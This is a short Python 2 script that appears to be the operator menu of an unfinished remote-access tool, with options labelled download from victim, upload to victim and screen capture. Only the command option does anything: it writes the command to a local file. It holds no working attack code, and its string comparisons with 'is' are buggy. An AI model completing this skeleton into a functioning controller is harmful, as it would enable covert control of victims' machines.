#!/usr/bin/python
#import msvcrt

while True:
    user_input = str(raw_input("[+] Type '1', '2', '3', '4', or 'q/Q'\n"))
    print(user_input)
    
    if user_input is '1':
        print("COMMAND!")
        command_input = raw_input("[+] What command do you want to run?\n")
        print("Command is " + command_input)
        
        f = open ('file.txt', 'w')
        f.write(user_input + '\n')
        f.write(command_input + '\n')
        f.close()
        
        continue

    elif user_input is '2':
        print("DOWNLOAD FROM VICTIM")
        continue
    elif user_input is '3':
        print("UPLOAD TO VICTIM")
        continue
    elif user_input is '4':
        print("SCREENCAPTURE")
        continue
    elif user_input is 'q':
        print("QUIT")
        break
    elif user_input is 'Q':
        print("QUIT")
        break
    else:
        print("[-] Invalid command.. let's start over")
        continue
